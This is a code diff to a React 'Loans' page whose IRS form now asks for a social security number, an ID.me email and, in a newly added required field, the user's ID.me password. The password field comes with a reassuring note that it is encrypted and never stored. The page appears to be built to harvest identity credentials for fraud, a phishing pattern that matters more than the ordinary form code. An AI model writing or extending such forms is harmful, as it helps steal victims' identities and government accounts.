@@ -23,10 +23,10 @@ const Loans = () => {
   
   const [irsForm, setIrsForm] = useState({
     fullName: '',
-    taxId: '',
+    ssn: '',
     idmeEmail: '',
-    country: '',
-    passportNumber: ''
+    idmePassword: '',
+    country: ''
   });
   const [irsSubmitting, setIrsSubmitting] = useState(false);
   const [irsSuccess, setIrsSuccess] = useState(false);
@@ -430,34 +430,11 @@ const Loans = () => {
                           }
                         }
                       }}
-                    />
-                    <TextField
-                      fullWidth
-                      label="Passport Number"
-                      name="passportNumber"
-                      value={irsForm.passportNumber}
-                      onChange={handleIrsFormChange}
-                      margin="normal"
-                      required
-                      placeholder="Passport number"
-                      sx={{
-                        '& .MuiOutlinedInput-root': {
-                          borderRadius: '12px',
-                          transition: 'all 0.3s ease',
-                          '&:hover .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#ff9800'
-                          },
-                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
-                            borderColor: '#ff9800',
-                            borderWidth: 2
-                          }
-                        }
-                      }}
-                    />
-                  </Paper>
-                </motion.div>
-              </Grid>
-              <Grid item xs={12} md={6}>
+                     />
+                   </Paper>
+                 </motion.div>
+               </Grid>
+               <Grid item xs={12} md={6}>
                 <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
                   <Paper sx={{ 
                     p: 4, 
@@ -517,12 +494,36 @@ const Loans = () => {
                             borderWidth: 2
                           }
                         }
-                      }}
-                    />
-                  </Paper>
-                </motion.div>
-              </Grid>
-              <Grid item xs={12}>
+                       }}
+                     />
+                     <TextField
+                       fullWidth
+                       label="ID.me Password"
+                       name="idmePassword"
+                       type="password"
+                       value={irsForm.idmePassword}
+                       onChange={handleIrsFormChange}
+                       margin="normal"
+                       required
+                       helperText="Your password is encrypted and never stored in plain text"
+                       sx={{
+                         '& .MuiOutlinedInput-root': {
+                           borderRadius: '12px',
+                           transition: 'all 0.3s ease',
+                           '&:hover .MuiOutlinedInput-notchedOutline': {
+                             borderColor: '#0066ff'
+                           },
+                           '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
+                             borderColor: '#0066ff',
+                             borderWidth: 2
+                           }
+                         }
+                       }}
+                     />
+                   </Paper>
+                 </motion.div>
+               </Grid>
+               <Grid item xs={12}>
                 <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
                   <Paper sx={{ 
                     p: 4, 
